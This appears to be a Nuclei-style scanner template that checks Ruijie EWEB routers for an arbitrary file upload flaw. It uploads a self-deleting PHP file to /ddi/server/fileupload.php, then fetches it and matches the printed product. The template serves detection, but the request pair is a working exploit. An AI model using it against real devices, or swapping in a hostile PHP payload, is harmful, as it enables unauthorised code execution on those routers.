id: ruijieEWEB-fileupload_php-File-upload

info:
  name: 锐捷EWEB路由器 fileupload.php 任意文件上传漏洞
  author: xxx
  severity: high
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /ddi/server/fileupload.php HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXarDTbMzZe2hdNu2

        ------WebKitFormBoundaryXarDTbMzZe2hdNu2
        Content-Disposition: form-data; name="uploadDir"

        upload
        ------WebKitFormBoundaryXarDTbMzZe2hdNu2
        Content-Disposition: form-data; name="file";filename="{{username}}.php"

        <?php print(1111*2222);unlink(__FILE__);?>
        ------WebKitFormBoundaryXarDTbMzZe2hdNu2--
  - raw:
      - |
        GET /ddi/server/upload/{{username}}.php HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '2468642'
      - type: status
        status: 
          - 200